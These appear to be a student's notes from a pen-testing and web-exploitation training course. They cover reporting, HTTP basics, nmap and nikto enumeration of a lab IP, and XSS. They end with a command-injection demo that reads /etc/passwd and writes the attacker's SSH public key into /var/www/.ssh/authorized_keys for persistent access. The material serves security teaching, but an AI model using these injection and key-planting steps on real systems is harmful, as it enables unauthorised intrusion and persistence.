## Misc 

https://sec.cybbh.io/public/security/latest/index.html
#### Test Day: August 15th

## Day 1 - Recon/Research/Pen Testing
### Pen Testing

#### Pen Testing Test Reporting

    OPNotes
      Actions being taken that works, maps, the things that have worked. Keeping track of the steps

    Penetration Test Reporting
      Executive Summary
        The tops, not evertything but a summary
      Technical Summary
        In the weeds, the more technical stuff
## Day 2 - Web Explotation
### HTTP Methods
    GET, POST, HEAD, PUT

### HTTP Response Codes
    10X Info, 2XX Success, 30X Redir, 4XX Client Err, 5XX Serv Err

### JavaScript (JS)
    HTML Frame of the House
    CSS is the paint and decoration
    JavaScript is used to change things afterwards

### HTTP Enumeration
```
nmap -v -sT -T5 --script http-enum.nse 10.50.31.75 -> web enum
nikto -h 10.50.31.75 -> info about the sub dirs 

sudo apt install nikto -y
```

### Cross-Site Scripting
    Attacker puts bad stuff on trusted website, it allows it to execute bad code
#### Reflected XSS
    Not stored, run JS on website, changes url, bad code in url
#### Stored XSS
    Actually stored on server

### Demo
    lin-ops> ssh-keyget -t rsa "enter", "enter" is in /home/student/.ssh/id_rsa"
    passhprhase -> blank
    have genterated key
    cd ~/.ssh 
    ca id_rsa.pub(lic key) "generated public key"
    in search box
        : whoami -> www-data
        : cat /etc/passswd -> home dir is /var/www
        : ls -la /var/www -> see if .ssh file is created
        : mksir /var/www/.ssh
        : echo "ssh-rsa 'key' student@lin-ops" > /var/www/.ssh/authorized_keys
